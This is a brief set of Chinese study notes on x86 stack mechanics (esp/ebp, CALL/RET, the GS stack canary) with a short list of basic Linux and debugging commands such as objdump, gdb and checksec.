栈的结构

  • 栈顶地址
  • 自身理解：首先入栈、出栈操作都是通过esp增加或者减少来改变的。便是假定ebp不动，入栈操作，esp减小，出栈操作，esp增加。当调用一个新的函数，首先将ebp函数入栈，然后ebp等于esp，便可以进行一段新的入栈操作。
  • 栈的守护天使—GS，也叫Stack Canary或Cookie

汇编语言Call、Ret

  • Call可看做 Push retaddr + Jump
  • Ret 可看做 Pop retaddr + Jump

Linux shell：

  • cd 打开
  • ls 列出当前目录下所有文件
  • chmod 改变文件使用权限
  • pwd 显示当前坐在目录
  • objdump 查看目标文件或者可执行的目标文件的构成
  • gdb 使用gdb进行调试
  • checksec 检测二进制的保护机制是否开启
  • mkdir 创建文件夹
